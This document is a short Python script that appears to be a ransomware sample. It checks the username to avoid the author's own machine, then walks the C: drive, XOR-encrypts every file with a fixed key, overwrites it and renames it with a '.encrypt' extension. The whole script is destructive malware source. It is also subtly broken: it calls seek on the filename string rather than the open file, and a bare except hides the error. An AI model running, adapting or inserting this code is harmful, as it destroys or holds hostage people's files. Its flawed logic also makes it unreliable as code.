import os

#print(os.environ.get('USERNAME'))
if(os.environ.get('USERNAME') == 'asdf'):
    print('host computer\n')
    exit(1)

def encrypt_buffer(buffer):
    barr = bytearray(buffer)
    i=0
    for c in buffer:
        c = c ^ 0x7a
        barr[i]=c
        i=i+1
    return barr

for root, ds, fs in os.walk('C:'):
        for f in fs:
            file_path = os.path.join(root,f)
            try:
                fd = open(file_path,'rb+')
            except:
                continue
            try:
                buffer = fd.read()
            except:
                fd.close()
                continue
            buffer = bytes(encrypt_buffer(buffer))
            try:
                f.seek(0)
                f.truncate(0)
                fd.write(buffer)
            except:
                fd.close()
                continue
            fd.close()
            os.rename(file_path,file_path+'.encrypt')
            print(file_path)
